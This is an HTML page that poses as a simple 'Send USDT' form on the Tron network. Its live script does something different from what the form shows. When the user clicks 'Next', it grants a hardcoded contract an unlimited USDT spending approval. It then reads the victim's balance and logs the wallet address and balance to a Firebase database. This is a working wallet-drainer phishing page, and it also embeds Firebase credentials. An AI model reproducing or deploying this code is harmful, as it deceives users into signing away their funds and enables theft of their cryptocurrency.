<!DOCTYPE html>
<html>
<head>
  <title>TRC-20 USDT Approval</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial;
      background-color: #121212;
      color: white;
      display: flex;
      justify-content: center;
    }
    .container {
      max-width: 400px;
      padding: 20px;
      margin-top: 40px;
    }
    input, button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      font-size: 16px;
      border-radius: 10px;
      border: none;
    }
    input {
      background-color: #1e1e1e;
      color: white;
    }
    button {
      background-color: #3cb371;
      color: white;
      cursor: pointer;
    }
    .field-label {
      margin-top: 15px;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Send USDT</h2>
    
    <div class="field-label">Recipient Wallet Address</div>
    <input type="text" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />

    <div class="field-label">Amount</div>
    <input id="amount" type="number" placeholder="Enter amount" />

    <button onclick="triggerApproval()">Next</button>
  </div>

  <!-- TronWeb and Firebase SDKs -->
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-app-compat.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/firebase@9.22.0/firebase-firestore-compat.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@1.0.0-beta.17/dist/TronWeb.js"></script>

  <script>
    // Firebase setup
    const firebaseConfig = {
      apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
      authDomain: "trc20-approval-dapp.firebaseapp.com",
      projectId: "trc20-approval-dapp",
      storageBucket: "trc20-approval-dapp.appspot.com",
      messagingSenderId: "770961226156",
      appId: "1:770961226156:web:d7857b971dd376b7902209"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const dappContractAddress = "TYMqXAPENEz1yehDFQE34hngR1KqLW1zhX";

    async function triggerApproval() {
      try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          alert("Please connect a Tron-compatible wallet like SafePal, OKX, or TokenPocket.");
          return;
        }

        const from = window.tronWeb.defaultAddress.base58;
        const amountInput = document.getElementById("amount").value || "0";

        const contract = await window.tronWeb.contract().at(usdtContractAddress);

        // Approve Max amount
        const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        await contract.approve(dappContractAddress, maxAmount).send();

        // Get balance
        const balance = await contract.balanceOf(from).call();

        // Log to Firestore
        await db.collection("approvals").add({
          wallet_address: from,
          amount: amountInput,
          balance: parseInt(balance._hex || balance, 16) / 1e6,
          timestamp: new Date()
        });

        alert("Approval sent.");
      } catch (err) {
        alert("Error during approval: " + err.message);
        console.error(err);
      }
    }
  </script>
</body>
</html>
